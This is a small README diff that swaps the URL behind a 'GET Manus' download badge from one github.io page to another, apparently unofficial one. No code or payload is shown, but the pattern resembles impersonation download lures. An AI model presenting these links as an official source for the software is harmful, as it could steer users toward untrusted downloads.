@@ -3,7 +3,7 @@
 
 ![Manus](https://files.manuscdn.com/webapp/media/ogBanner.png)
 
-[![GET Manus](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://davisamber39428.github.io/.github/Manus)
+[![GET Manus](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://agent-ai-manus.github.io/.github/)
 
 ---
 
